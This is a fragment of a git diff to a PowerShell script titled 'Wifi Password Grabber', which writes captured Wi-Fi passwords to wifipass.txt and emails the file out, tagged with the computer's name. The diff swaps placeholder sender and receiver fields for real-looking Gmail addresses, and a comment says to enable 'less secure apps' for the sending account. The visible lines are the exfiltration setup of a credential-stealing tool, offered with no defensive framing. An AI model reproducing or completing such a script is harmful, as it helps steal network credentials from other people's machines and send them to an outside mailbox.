@@ -25,9 +25,9 @@ Out-File wifipass.txt -Append -InputObject $a
 
 # --------Email the output file---------
 # Allow less secure apps for the sender email (https://myaccount.google.com/lesssecureapps)
-$FROM = "SENDER_EMAIL"
+$FROM = "brendancdj@gmail.com"
 $PASS = "SENDER_PASS"
-$TO = "RECEIVER_EMAIL"
+$TO = "brendandesjardins@gmail.com"
 
 $PC_NAME = "$env:computername"
 $SUBJECT = "Wifi Password Grabber - " + $PC_NAME
